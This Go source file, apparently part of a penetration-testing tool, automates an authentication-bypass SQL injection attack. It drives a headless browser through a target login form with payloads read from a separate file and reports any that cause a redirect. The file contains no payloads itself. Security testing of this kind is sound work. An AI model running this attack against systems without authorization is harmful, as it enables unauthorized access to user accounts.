package pentest

import (
	"context"
	"fmt"
	"time"

	"github.com/chromedp/chromedp"
)

func AuthBypassSQLInjection(target string) bool {

	foundOrNot := false
	fmt.Println()
	fmt.Println("Target connected, start attacking...")
	fmt.Println("Start Auth Bypass SQL Injection")

	payload, payloaderror := ReadPayload("pentest/payload/SQL/authSQL.txt")
	if payloaderror != nil {
		fmt.Printf("Error reading payload file: %s\n", payloaderror)
	}

	// start attack
	for _, trial := range payload {
		// create new session everytime so the cookies and csrf token would match
		newSession := context.Background()
		content, cancel := chromedp.NewContext(newSession)
		defer cancel()
		loginNoError := Login(content, trial, trial, target)
		if loginNoError {
			foundOrNot = true
			fmt.Println("Login Successful: ", trial)
		}
	}

	return foundOrNot
}

func Login(content context.Context, username string, password string, target string) bool {
	timeoutContent, cancel := context.WithTimeout(content, 10*time.Second)
	defer cancel()
	var currentURL string

	loginError := chromedp.Run(timeoutContent,
		chromedp.Navigate(target),
		chromedp.SendKeys(`input[name="username"]`, username),
		chromedp.SendKeys(`input[name="password"]`, password),
		chromedp.Click(`button`),
		chromedp.WaitReady(`body`),
		chromedp.Location(&currentURL),
	)
	// Check for redirection
	if currentURL != target && loginError == nil {
		return true
	}
	return false
}
